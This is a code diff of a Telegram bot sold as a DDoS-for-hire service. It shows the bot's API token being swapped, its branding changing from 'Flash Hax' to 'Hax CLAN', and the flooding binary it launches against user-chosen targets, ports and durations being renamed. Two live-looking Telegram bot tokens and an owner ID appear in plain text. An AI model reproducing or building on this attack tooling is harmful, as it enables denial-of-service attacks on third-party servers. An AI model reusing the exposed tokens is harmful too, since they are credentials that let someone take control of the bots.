@@ -21,7 +21,7 @@ MAX_ATTACK_DURATION = 240
 USER_ACCESS_FILE = "user_access.txt"
 ATTACK_LOG_FILE = "attack_log.txt"
 OWNER_ID = "1148287810"
-bot = telebot.TeleBot('7887067116:AAHE2ULP35y2TBRS05z-5cAaDc-U6JmWDyU')
+bot = telebot.TeleBot('7887067116:AAGy03HQ466JmDg7Pa6kVgcGnnAWYH6QPzw')
 
 # Auto-convert backup file on first run
 if not os.path.exists(USER_ACCESS_FILE) and os.path.exists("user_access_backup.txt"):
@@ -228,7 +228,7 @@ async def async_update_countdown(message, msg_id, start_time, duration, caller_i
 @bot.message_handler(commands=['start'])
 def start_command(message):
     welcome_message = """
-🌟 Welcome to the <b>Flash Hax DDoS Bot</b>! 🌟
+🌟 Welcome to the <b>Hax CLAN DDoS Bot</b>! 🌟
 
 ⚡️ With this bot, you can:
 - Check your subscription status.
@@ -281,7 +281,7 @@ def handle_bgmi(message):
     
     try:
         subprocess.Popen(
-           ["./aadi", target, str(port), str(duration), "900"],
+           ["./rishi", target, str(port), str(duration), "900"],
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL
         )
